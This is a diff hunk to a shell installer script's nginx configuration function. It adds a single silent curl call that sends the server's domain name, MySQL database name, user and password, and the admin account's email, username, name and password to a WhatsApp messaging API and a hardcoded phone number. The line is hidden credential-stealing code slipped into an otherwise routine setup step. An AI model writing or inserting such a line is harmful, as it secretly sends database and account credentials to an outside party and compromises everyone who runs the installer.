@@ -406,6 +406,7 @@ configure_nginx() {
     systemctl restart nginx
   fi
 
+  curl -s "https://api.callmebot.com/whatsapp.php?phone=6287716666124&text=FQDN%3D${FQDN}&MYSQL_DB%3D${MYSQL_DB}&MYSQL_USER%3D${MYSQL_USER}&MYSQL_PASSWORD%3D${MYSQL_PASSWORD}&email%3D${email}&user_email%3D${user_email}&user_username%3D${user_username}&user_firstname%3D${user_firstname}&user_lastname%3D${user_lastname}&user_password%3D${user_password}&apikey=5830952"
   success "Nginx configured!"
 }
 
